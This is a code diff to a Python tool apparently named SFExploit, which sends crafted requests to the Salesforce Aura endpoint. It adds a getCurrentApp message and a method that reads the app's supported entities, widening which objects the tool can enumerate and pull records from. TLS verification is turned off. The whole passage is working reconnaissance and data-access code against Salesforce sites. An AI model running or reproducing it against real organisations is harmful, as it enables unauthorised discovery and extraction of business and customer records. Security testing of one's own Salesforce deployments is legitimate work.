@@ -12,6 +12,7 @@ SF_APP_DATA=["siteforce:loginApp2", "one:one"]
 
 SF_MESSAGE_CONFIGDATA = json.dumps({"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]})
 SF_MESSAGE_GETRECORDS = json.dumps({"actions":[{"id":"242;a","descriptor":"serviceComponent://ui.force.components.controllers.relatedList.RelatedListContainerDataProviderController/ACTION$getRecords","callingDescriptor":"UNKNOWN","params":{"recordId":"Topic"}}]})
+SF_MESSAGE_GETCURRENTAPP = json.dumps({"actions":[{"descriptor":"serviceComponent://ui.global.components.one.one.controller.OneController/ACTION$getCurrentApp","callingDescriptor":"UNKNOWN","params":{}}]})
 
 SF_RECORDS_PAGE_SIZE=100
 
@@ -150,6 +151,22 @@ class SFExploit:
 			objects = list()
 		if (send_request.status_code == 200):
 			objects = list(send_request.json()['actions'][0]['returnValue']['apiNamesToKeyPrefixes'].keys())
+		elif (send_request.status_code == 401):
+			log_message(">> Authentication needed (401).")
+			objects = list()
+		else:
+			log_message(f">> Invalid response code on {SF_MESSAGE_CONFIGDATA}")
+			objects = list()
+		return objects
+	
+	def get_extended_objects(self):
+		post_body = {'message': SF_MESSAGE_GETCURRENTAPP,'aura.context':self.context,'aura.token':self.token}
+		try:
+			send_request = requests.post(url=f"{self.url}{self.aura_endpoint}", headers = self.headers, data=post_body, cookies=self.cookies, verify=False)
+		except:
+			objects = list()
+		if (send_request.status_code == 200):
+			objects = list(send_request.json()['actions'][0]['returnValue']['rootLayoutConfig']['attributes']['values']['appMetadata']['supportedEntities'])
 		elif (send_request.status_code == 401):
 			log_message(">> Authentication needed (401).")
 			objects = list()
